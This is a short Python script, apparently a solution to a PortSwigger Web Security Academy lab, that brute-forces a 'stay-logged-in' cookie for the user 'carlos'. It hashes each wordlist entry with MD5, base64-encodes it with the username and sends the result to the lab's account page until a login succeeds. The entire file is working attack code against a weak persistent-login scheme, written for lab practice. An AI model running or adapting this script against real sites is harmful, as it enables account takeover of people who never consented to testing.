#Brute-forcing a stay-logged-in cookie
#Bruteforcing cookies for known username and [Stay Logged in ] is enabled

import requests
import hashlib
import base64

url = "https://0a37009c045490e0c0cd0bfc00dc0092.web-security-academy.net/my-account"
fd = open("/home/tester13/Documents/CTF/Portswigger/Authentication/pass.txt","r")
wordlists = fd.read()
fd.close()
password_list = list(wordlists.split('\n'))
#print(password_list)


#Required cookies
#stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; session=2emwO5pGKhR2F1cXCToYJ5qDX6zwKCSp
#print(cookie_value)
for i in password_list:
    #format of the cookie is:
    #base64(carlos:md5(password))
    hashvalue = hashlib.md5(i.encode()).hexdigest()
    hashvalue = "carlos:"+hashvalue   #carlos id is known
    cookie_value = base64.b64encode(hashvalue.encode()).decode()
    cookie={
        "session":"2emwO5pGKhR2F1cXCToYJ5qDX6zwKCSp",
        "stay-logged-in":cookie_value
    }

    r = requests.post(url,cookies=cookie)
    if "My Account" in r.text:
        print(i)
        break



